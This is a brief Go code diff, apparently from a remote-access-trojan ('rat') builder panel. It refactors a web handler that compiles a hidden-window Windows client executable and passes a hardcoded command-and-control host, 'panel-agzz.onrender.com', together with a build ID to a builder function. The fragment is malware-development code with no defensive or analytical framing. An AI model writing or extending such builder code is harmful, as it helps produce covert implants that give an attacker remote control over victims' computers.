@@ -10,6 +10,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"rat/builder"
 	"strings"
 	"sync"
 	"time"
@@ -119,7 +120,7 @@ func createBuildHandler(w http.ResponseWriter, r *http.Request) {
 	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", "client.exe", "client.go")
 	cmd.Dir = tmpDir
 	cmd.Env = append(os.Environ(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64")
-	if err := BuildClient("panel-agzz.onrender.com"); err != nil {
+	if err := builder.BuildClient("panel-agzz.onrender.com", buildID); err != nil {
 		http.Error(w, "build failed: "+err.Error(), http.StatusInternalServerError)
 		return
 	}
